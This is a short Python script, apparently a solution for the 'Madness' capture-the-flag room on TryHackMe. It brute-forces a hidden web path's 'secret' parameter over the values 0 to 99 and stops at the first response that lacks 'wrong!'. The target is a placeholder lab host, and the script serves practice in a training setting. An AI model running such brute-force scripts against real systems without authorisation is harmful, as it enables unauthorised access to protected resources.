#! /usr/bin/env python3.6
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright 2021 leaundre leaundre.jackson87@gmail.com
#
# Distributed under terms of the %LICENSE% license.

"""
Brute Forcing Script from Madness Room on TryHackme
"""
# libs needed for the script to work
import os
import sys
import requests

# we specify the url
URL = "http://$IP/th1s_1s_h1dd3n/?secret={}"

print("Bruteforcing the directory...")

# here is the real bruteforcing...
# It checks which number will return a good #response
for i in range(100):
    r = requests.get(url=URL.format(i))
    data = r.text

    # it checks if the string "wrong!" is in the response. If yes continue with
    # bruteforcing, if no print the number
    if 'wrong!' in data:
        if i == 25:
            print("Number 25 reached. Nothing found yet...")
        elif i == 50:
            print("Number 50 reached. Nothing found yet...")
        continue
    else:
        print("FOUND IT >> Secret {}".format(i))
    break
